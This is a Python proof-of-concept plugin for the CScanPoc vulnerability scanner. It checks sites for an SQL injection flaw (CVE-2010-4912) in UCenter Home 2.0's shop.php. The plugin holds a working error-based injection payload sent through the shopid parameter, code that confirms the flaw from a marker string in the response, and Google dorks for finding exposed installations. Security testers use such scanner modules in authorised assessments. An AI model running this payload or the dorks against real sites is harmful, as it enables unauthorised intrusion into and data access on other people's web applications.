# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'UCenter_0001'  # 平台漏洞编号，留空
    name = 'UCenter Home 2.0 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = ' 2010-09-13'  # 漏洞公布时间
    desc = '''
        UCenter 的中文意思就是用户中心，其中的 U 代表 User 也代表 You ，取其中的含义就是“用户中心”，或者说“你（最终用户）的中心”。 UCenter 是 Comsenz 旗下各个产品之间信息直接传递的一个桥梁，通过 UCenter 站长可以无缝整合 Comsenz 系列产品，实现用户的一站式注册、登录、退出以及社区其他数据的交互。
        Script HomePage : http://u.discuz.net/
        Dork : Powered by UCenter inurl:shop.php?ac=view
        Dork 2 : inurl:shop.php?ac=view&shopid=
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/14997/'  # 漏洞来源
    cnvd_id = 'CNVD-2011-5971'  # cnvd漏洞编号
    cve_id = 'CVE-2010-4912'  # cve编号
    product = 'UCenter-Home'  # 漏洞应用名称
    product_version = '2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '87bcd08f-0d05-4979-8b24-a5487ba048c3'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/shop.php?ac=view&shopid=253 AND (SELECT 4650 FROM(SELECT COUNT(*),"
                       "CONCAT(0x716b6a6271,(SELECT (CASE WHEN (4650=4650) THEN 1 ELSE 0 END)),"
                       "0x7178787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
            verify_url = self.target + payload

            content = requests.get(verify_url).text
            if 'qkjbq1qxxpq1' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
